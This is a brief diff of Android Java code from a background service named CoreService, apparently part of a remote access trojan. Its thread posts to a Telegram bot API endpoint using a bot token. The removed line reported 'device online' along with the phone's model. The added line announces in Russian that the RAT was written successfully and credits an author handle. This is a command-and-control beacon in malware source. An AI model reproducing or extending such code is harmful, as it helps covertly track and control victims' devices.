@@ -29,7 +29,7 @@ public class CoreService extends Service {
             @Override
             public void run() {
                 try {
-                    String text = "Привет! Устройство на связи. Модель: " + android.os.Build.MODEL;
+                    String text = "Приветствую, Bruno. Рат успешно написан. Скрипт написан: @lotrexyx";
                     String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                     URL url = new URL(urlString);
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
